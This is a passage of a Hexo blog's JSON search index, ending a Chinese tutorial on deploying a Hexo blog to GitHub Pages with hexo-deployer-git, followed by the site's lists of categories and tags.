作为 deployer，所以需要手动安装一个插件。 1npm install hexo-deployer-git --save 生成站点文件并部署至远程库： 1hexo clean &amp;&amp; hexo deploy --generate 至此，就完成了使用Github Pages 部署 Hexo 个人博客的全部过程，总的来说还是很顺利的。 参考链接 Github Pages 搭建教程 将Hexo 部署到 GitHub Pages Hexo 一键部署 Github Pages部署个人博客（Hexo篇）","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"GitHub","slug":"Tutorial/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/GitHub/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]}],"categories":[{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/categories/Socket-io/"},{"name":"Nginx","slug":"Socket-io/Nginx","permalink":"https://www.0x2beace.com/categories/Socket-io/Nginx/"},{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"},{"name":"Skill","slug":"Git/Skill","permalink":"https://www.0x2beace.com/categories/Git/Skill/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Windows","slug":"Linux/Windows","permalink":"https://www.0x2beace.com/categories/Linux/Windows/"},{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"},{"name":"Windows","slug":"Skill/Windows","permalink":"https://www.0x2beace.com/categories/Skill/Windows/"},{"name":"Mac","slug":"Skill/Windows/Mac","permalink":"https://www.0x2beace.com/categories/Skill/Windows/Mac/"},{"name":"Linux","slug":"Tutorial/Linux","permalink":"https://www.0x2beace.com/categories/Tutorial/Linux/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/categories/Shell/"},{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Tutorial","slug":"PHP/Tutorial","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/categories/Node/"},{"name":"Socket.io","slug":"Node/Socket-io","permalink":"https://www.0x2beace.com/categories/Node/Socket-io/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"},{"name":"一些经验","slug":"一些经验","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"},{"name":"命令整理","slug":"Linux/命令整理","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"Tutorial","slug":"Node/Tutorial","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/"},{"name":"GitHub","slug":"Tutorial/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/GitHub/"},{"name":"前端","slug":"前端","permalink":"https://www.0x2beace.com/categories/%E5%89%8D%E7%AB%AF/"},{"name":"Skill","slug":"Tutorial/Skill","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/"},{"name":"GitHub","slug":"Tutorial/Skill/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/GitHub/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/tags/Socket-io/"},{"name":"wss","slug":"wss","permalink":"https://www.0x2beace.com/tags/wss/"},{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"},{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Arch Linux","slug":"Arch-Linux","permalink":"https://www.0x2beace.com/tags/Arch-Linux/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"WSL","slug":"WSL","permalink":"https://www.0x2beace.com/tags/WSL/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"},{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"mysql","slug":"mysql","permalink":"https://www.0x2beace.com/tags/mysql/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"进程管理","slug":"进程管理","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"},{"name":"Hash","slug":"Hash","permalink":"https://www.0x2beace.com/tags/Hash/"},{"name":"Web 安全","slug":"Web-安全","permalink":"https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"},{"name":"https","slug":"https","permalink":"https://www.0x2beace.com/tags/https/"},{"name":"Vim","slug":"Vim","permalink":"https://www.0x2beace.com/tags/Vim/"},{"name":"ssh","slug":"ssh","permalink":"https://www.0x2beace.com/tags/ssh/"},{"name":"PM2","slug":"PM2","permalink":"https://www.0x2beace.com/tags/PM2/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://www.0x2beace.com/tags/JavaScript/"},{"name":"CI","slug":"CI","permalink":"https://www.0x2beace.com/tags/CI/"}]}